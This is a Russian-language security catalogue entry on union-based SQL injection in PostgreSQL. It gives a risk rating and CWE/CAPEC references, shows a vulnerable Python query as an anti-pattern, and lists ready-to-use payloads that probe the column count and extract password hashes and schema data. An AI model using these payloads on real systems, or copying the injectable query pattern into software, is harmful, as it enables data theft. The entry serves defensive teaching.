# 02 — Union-based Injection

- **`vuln_class`:** `SQL_INJ_UNION`
- **Риск:** 9/10
- **CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) (вариант)
- **CAPEC:** [CAPEC-66](https://capec.mitre.org/data/definitions/66.html), частный случай.

## Что

Вариант SQLi, где атакующий через `UNION SELECT` дописывает к легитимному запросу второй, извлекая данные **из других таблиц**, не предусмотренных оригинальной выборкой. Атакующий подбирает совместимое число и типы колонок, затем читает что хочет.

## Почему опасно (риск 9)

Чуть ниже «классики» (10) потому, что:
- Требует, чтобы оригинальный запрос выводил данные пользователю.
- Не даёт сразу `UPDATE`/`DELETE` (для этого нужен stacked-injection, см. [01-sql-injection-classic](../01-sql-injection-classic/)).

Но всё ещё критичен:
- **Сквозное чтение** любой таблицы в схеме.
- Через `information_schema.columns` — полная enumeration схемы → дальнейшая атака точечно.
- Через `pg_authid` (если роль имеет `SELECT`) — хеши паролей superuser.

## PostgreSQL specifics

- **Типы должны совпадать** — `UNION` требует, чтобы типы колонок были совместимы. Атакующий обходит через `NULL`, `CAST('...' AS text)`, `::text`.
- **`information_schema` доступна `PUBLIC`** по умолчанию — атакующий всегда может прочитать структуру схемы.
- **`pg_catalog` доступен `PUBLIC`** — атакующий узнаёт имена ролей, owner'ов таблиц.
- **`UNION ALL` vs `UNION`** — оба подходят, `UNION ALL` быстрее и не дедуплицирует.
- В payload часто комментарий `--` в конце — отрезает «хвост» оригинального запроса.

## Пример атаки

**Антипаттерн:**
```python
search = request.args.get("q")
cursor.execute(f"SELECT id, title FROM products WHERE title ILIKE '%{search}%'")
```

**Payload (определение числа колонок):**
```
q = "x' UNION SELECT NULL, NULL --"
q = "x' UNION SELECT NULL, NULL, NULL --"
```
→ когда не падает «UNION queries must have the same number of columns» — нашли число.

**Payload (определение строкового индекса):**
```
q = "x' UNION SELECT 'a', NULL --"
q = "x' UNION SELECT NULL, 'a' --"
```
→ когда возвращается видимое `'a'` — нашли строковый столбец, доступный пользователю.

**Payload (эксфильтрация):**
```
q = "x' UNION SELECT username, password_hash FROM auth.users --"
q = "x' UNION SELECT table_name, NULL FROM information_schema.tables --"
q = "x' UNION SELECT current_user, version() --"
```

## Внешние ссылки

- **CWE-89**, **CAPEC-66** (Union variant) — в шапке.
- **research/materials/05-security-benchmarks-datasets/rbsqli-10m/** — Union payloads.
- **research/materials/04-security-attacks/gsqli-gan-waf-bypass/** — GAN-мутации Union payloads для WAF-bypass.
- **PortSwigger** «Retrieving data from other tables» chapter.
- **sqlmap payloads/union_query.xml** — regression set.

## Варианты решения

См. [solutions.md](solutions.md).
